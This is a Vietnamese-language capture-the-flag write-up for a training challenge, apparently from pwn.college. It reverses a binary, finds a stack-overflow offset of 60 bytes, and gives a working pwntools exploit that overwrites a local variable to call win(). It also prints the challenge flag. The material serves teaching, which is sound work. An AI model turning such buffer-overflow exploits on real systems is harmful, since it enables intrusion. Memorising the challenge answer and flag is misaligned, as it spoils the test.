## 📌 [Viettel Training Program] - Variable Control (hard)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Hard
- **Points:** —
- **Description:** Cùng ý tưởng với bản easy — overflow buffer để set `win_variable` thành một giá trị cụ thể, có `lose_variable` phía sau cần tránh — nhưng **không in offset, dump stack, hay source**. Giá trị win và kích thước buffer có thể khác. Binary: `binary-exploitation-var-control`.

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-var-control
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

**Nhận xét nhanh:**

- **Stack Canary bật** → Không ghi đè quá xa (canary offset ~72), nhưng bài chỉ cần ghi 64 byte.
- **NX enabled** → Không cần shellcode.
- **PIE disabled** → Địa chỉ code cố định.
- **Không có output debug** (khác easy) → Offset và giá trị win phải tự tìm bằng disassembly / GDB.

**So với bản easy:**

| | Easy (`-w`) | Hard |
|---|-------------|------|
| Binary | `binary-exploitation-var-control-w` | `binary-exploitation-var-control` |
| Source | Có source | **Chỉ binary** |
| In offset / dump stack | Có | **Không** |
| Giá trị `win_variable` cần set | `0x05ad2f20` | **`0x200fcb8a`** |
| Offset → `win_variable` | 52 | **60** |
| Offset → `lose_variable` | 56 | **64** |
| Payload tối thiểu | 56 byte | **64 byte** |

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích tĩnh (objdump / Ghidra)

Disassembly hàm `challenge()` (địa chỉ `0x401a91`):

```asm
; Khởi tạo vùng nhớ (8 QWORD + 1 DWORD = 68 bytes zero)
movq   $0x0, -0x50(%rbp)       ; input[0..7]
movq   $0x0, -0x48(%rbp)       ; input[8..15]
movq   $0x0, -0x40(%rbp)       ; input[16..23]
movq   $0x0, -0x38(%rbp)       ; input[24..31]
movq   $0x0, -0x30(%rbp)       ; input[32..39]
movq   $0x0, -0x28(%rbp)       ; input[40..47]
movq   $0x0, -0x20(%rbp)       ; input[48..55]
movq   $0x0, -0x18(%rbp)       ; input[56..63]
movl   $0x0, -0x10(%rbp)       ; lose_variable (int)

; read(0, rbp-0x50, 4096)
lea    -0x50(%rbp), %rax        ; input buffer
mov    $0x1000, %edx
call   read@plt

; Kiểm tra lose_variable
mov    -0x10(%rbp), %eax        ; rbp-0x10
test   %eax, %eax
jne    lose_set → exit

; Kiểm tra win_variable
mov    -0x14(%rbp), %eax        ; rbp-0x14
cmp    $0x200fcb8a, %eax        ; *** GIÁ TRỊ KHÁC BẢN EASY ***
jne    skip_win
call   win()
```

Dựng lại cấu trúc:

```c
struct {
    char input[60];      // rbp-0x50 … rbp-0x15
    int win_variable;    // rbp-0x14
    int lose_variable;   // rbp-0x10
} data = {0};

read(0, &data.input, 4096);

if (data.lose_variable) { exit(1); }
if (data.win_variable == 0x200fcb8a)   // 537819018
    win();
```

### Tính offset từ disassembly

| Thành phần | Vị trí stack | Offset từ `input` |
|------------|--------------|-------------------|
| `input[60]` | `rbp-0x50` … `rbp-0x15` | 0 – 59 |
| `win_variable` | `rbp-0x14` | **60 – 63** |
| `lose_variable` | `rbp-0x10` | **64 – 67** |
| Stack canary | `rbp-0x8` | 72 – 79 (không động tới) |

Khoảng cách: `0x50 - 0x14 = 0x3C` → **60 byte** padding trước `win_variable`.

### Phân tích động (GDB / pwndbg)

```text
$ gdb ./binary-exploitation-var-control
pwndbg> break *challenge+0x102    # sau lệnh read (0x401b93)
pwndbg> run
Send your payload (up to 4096 bytes)!
pwndbg> cyclic 80
pwndbg> continue
pwndbg> x/wx $rbp-0x14            # win_variable
0x7fffffffe4bc: 0x61616161

pwndbg> cyclic -l 0x61616161
[*] Found offset of 60

pwndbg> x/wx $rbp-0x10            # lose_variable
0x7fffffffe4c0: 0x00000000        # chưa bị động tới (nếu payload ≤ 64 byte)
```

Xác nhận giá trị win từ lệnh `cmp $0x200fcb8a,%eax`:
- `0x200fcb8a` = 537819018
- Viết little-endian: `\x8a\xcb\x0f\x20`

### Xác nhận nhanh

```bash
python3 -c '
import sys
WIN_VALUE = 0x200fcb8a
payload = b"A" * 60 + WIN_VALUE.to_bytes(4, "little")
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-var-control
```

## 3. Ý tưởng Tấn công (Exploit Strategy)

Giống bản easy (variable overwrite + tránh lose_variable) nhưng với thông số khác:

1. Gửi **60 byte** padding (lấp `input[]`).
2. Ghi **4 byte** little-endian của `0x200fcb8a` (`\x8a\xcb\x0f\x20`).
3. **Dừng lại ngay** — không ghi thêm byte nào (lose_variable ở offset 64).
4. `if (data.win_variable == 0x200fcb8a)` → `win()` → in flag.

> Payload tối đa **64 byte**. Nếu ghi tới byte 68+, `lose_variable` bị set.

> **Giá trị win khác bản easy** (`0x200fcb8a` vs `0x05ad2f20`) — không copy mù quáng.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-var-control")
# r = process("./binary-exploitation-var-control")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET_WIN = 60     # input → win_variable (hard, khác easy: 52)
OFFSET_LOSE = 64    # input → lose_variable (hard, khác easy: 56)
WIN_VALUE = 0x200fcb8a  # 537819018 (khác easy: 0x05ad2f20)

payload = flat({
    OFFSET_WIN: p32(WIN_VALUE),  # win_variable = 0x200fcb8a
})

r.sendafter(b"Send your payload", payload)

r.interactive()
```

Payload tối thiểu (local):

```python
from pwn import *
r = process("./binary-exploitation-var-control")
r.sendafter(b"Send your payload", b"A" * 60 + p32(0x200fcb8a))
r.interactive()
```

Hoặc không dùng pwntools (local):

```bash
python3 -c '
import sys
WIN_VALUE = 0x200fcb8a
payload = b"A" * 60 + WIN_VALUE.to_bytes(4, "little")
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-var-control
```

## 5. Kết quả & Flag

Chạy exploit trên môi trường challenge (có `/flag`, binary SUID nếu yêu cầu):

```text
Send your payload (up to 4096 bytes)!
You win! Here is your flag:
pwn.college{wUsN_UzSafhO5cPXJLlK7I780SU.QX4UzMzwSMzgjNwEzW}
```

*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win()` đã được gọi.)*

**Lessons Learned (Bài học rút ra):**

- Bản **hard** thay đổi **cả offset lẫn giá trị win**: offset 60 (≠ 52), value `0x200fcb8a` (≠ `0x05ad2f20`).
- Phải dùng **disassembly** để tìm offset (`rbp-0x50` → `rbp-0x14`) và giá trị win (`cmp $0x200fcb8a`).
- **Endianness** vẫn quan trọng: `0x200fcb8a` → `\x8a\xcb\x0f\x20`.
- `lose_variable` vẫn ở ngay sau `win_variable` → cần cắt payload chính xác (≤ 64 byte).
- Không copy mù quáng thông số từ bản easy — luôn kiểm tra lại bằng reverse engineering.
